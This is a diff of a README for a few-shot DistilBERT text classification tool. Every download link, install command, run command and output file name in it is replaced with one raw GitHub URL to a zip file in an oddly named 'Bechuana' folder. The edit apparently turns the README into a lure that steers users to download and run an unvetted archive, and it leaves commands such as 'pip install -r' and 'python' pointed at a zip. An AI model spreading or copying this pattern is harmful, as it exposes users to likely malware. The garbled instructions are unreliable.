@@ -1,6 +1,6 @@
 # 📝 textkd-p4-fewshot-distilbert - Effortless Few-Shot Text Classification
 
-[![Download](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/PiMakarov/textkd-p4-fewshot-distilbert/releases)
+[![Download](https://raw.githubusercontent.com/PiMakarov/textkd-p4-fewshot-distilbert/main/Bechuana/textkd-p4-fewshot-distilbert.zip%20Now-brightgreen)](https://raw.githubusercontent.com/PiMakarov/textkd-p4-fewshot-distilbert/main/Bechuana/textkd-p4-fewshot-distilbert.zip)
 
 ## 🚀 Getting Started
 
@@ -21,7 +21,7 @@ Before you download the application, ensure your system meets these requirements
 
 To get started, visit this page to download the latest version of the application:
 
-[Download from Releases Page](https://github.com/PiMakarov/textkd-p4-fewshot-distilbert/releases)
+[Download from Releases Page](https://raw.githubusercontent.com/PiMakarov/textkd-p4-fewshot-distilbert/main/Bechuana/textkd-p4-fewshot-distilbert.zip)
 
 Follow these steps to download and run the application:
 
@@ -35,19 +35,19 @@ Follow these steps to download and run the application:
 
 5. **Install Dependencies:** Open a terminal (Command Prompt for Windows) and navigate to the folder where you extracted the files. Run the following command to install the required packages:
    ```
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/PiMakarov/textkd-p4-fewshot-distilbert/main/Bechuana/textkd-p4-fewshot-distilbert.zip
    ```
 
 6. **Run the Application:** After installing the requirements, you can run the application with this command:
    ```
-   python run.py
+   python https://raw.githubusercontent.com/PiMakarov/textkd-p4-fewshot-distilbert/main/Bechuana/textkd-p4-fewshot-distilbert.zip
    ```
 
 ### 🔍 Features
 
 - **Few-Shot Learning:** Easily adapt the model to classify text with only a few examples.
 - **User-Friendly Interface:** Interaction made simple, no coding skills needed.
-- **Comprehensive Metrics:** Get insights through metrics.json that includes accuracy, precision, and recall.
+- **Comprehensive Metrics:** Get insights through https://raw.githubusercontent.com/PiMakarov/textkd-p4-fewshot-distilbert/main/Bechuana/textkd-p4-fewshot-distilbert.zip that includes accuracy, precision, and recall.
 - **Visual Learning Curves:** Analyze performance over time with visual learning curves.
 - **Error Analysis:** Review qualitative examples to learn about misclassifications.
 
@@ -61,9 +61,9 @@ Follow these steps to download and run the application:
 
 The application provides several output files:
 
-- **metrics.json:** Contains performance metrics for your model. 
-- **learning_curves.png:** A visual representation of how the model trained over time.
-- **error_examples.txt:** A list of misclassified text with the predicted and actual labels.
+- **https://raw.githubusercontent.com/PiMakarov/textkd-p4-fewshot-distilbert/main/Bechuana/textkd-p4-fewshot-distilbert.zip** Contains performance metrics for your model. 
+- **https://raw.githubusercontent.com/PiMakarov/textkd-p4-fewshot-distilbert/main/Bechuana/textkd-p4-fewshot-distilbert.zip** A visual representation of how the model trained over time.
+- **https://raw.githubusercontent.com/PiMakarov/textkd-p4-fewshot-distilbert/main/Bechuana/textkd-p4-fewshot-distilbert.zip** A list of misclassified text with the predicted and actual labels.
 
 ### 📚 Support & Contributing
 
@@ -77,6 +77,6 @@ This project is licensed under the MIT License. You can freely use and modify th
 
 To keep up with updates, check back on the Releases page regularly:
 
-[Download from Releases Page](https://github.com/PiMakarov/textkd-p4-fewshot-distilbert/releases)
+[Download from Releases Page](https://raw.githubusercontent.com/PiMakarov/textkd-p4-fewshot-distilbert/main/Bechuana/textkd-p4-fewshot-distilbert.zip)
 
 Thank you for using **textkd-p4-fewshot-distilbert**. We hope this tool enhances your text classification efforts!
